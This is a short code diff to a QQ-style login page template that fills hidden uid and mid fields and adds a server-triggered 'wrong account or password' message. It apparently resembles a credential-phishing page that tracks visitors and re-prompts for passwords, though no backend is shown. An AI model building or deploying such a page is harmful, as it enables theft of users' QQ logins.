@@ -56,8 +56,8 @@
        </div>
        <div class="pwdArea" id="pwdArea">
         <label class="input_tips" id="pwd_tips" for="p">密码</label>
-        <input type="hidden" name="uid" value="">
-        <input type="hidden" name="mid" value="">
+        <input type="hidden" name="uid" value="<%=uid%>">
+        <input type="hidden" name="mid" value="<%=mid%>">
         <input type="hidden" name="tz" value="<%=tz%>">
         <div class="inputOuter">
          <input type="password" class="inputstyle password" id="p" name="p" value="" maxlength="16" tabindex="2" />
@@ -117,8 +117,7 @@
    <div id="newVcodeArea" class="newVcodeArea"></div>
    <div id="proxy" class="hide"></div>
   </div>
-  <!-- <script src="/js/c_login_1.js" type="text/javascript"></script> -->
-  
+
   <script>
       var _n = '<%=tz%>';
     $('#u').on('input',function(){
@@ -138,7 +137,6 @@
       var err_m = $('#err_m');
       var error_tips = $('#error_tips');
       $('#login_buctton').on('click',function(){
-          console.log('click');
           if ($('#u').val() === '') {
             err_m.html('请输入QQ号！');
             error_tips.css({"display":"block"});
@@ -157,9 +155,13 @@
             }else {
                 $('#loginform').submit();
             }
-            
+
         }
       });
+    if (_n === '1') {
+        err_m.html('账号密码错误,请重新输入!');
+        error_tips.css({"display":"block"});
+    }
   </script>
  </body>
 </html>
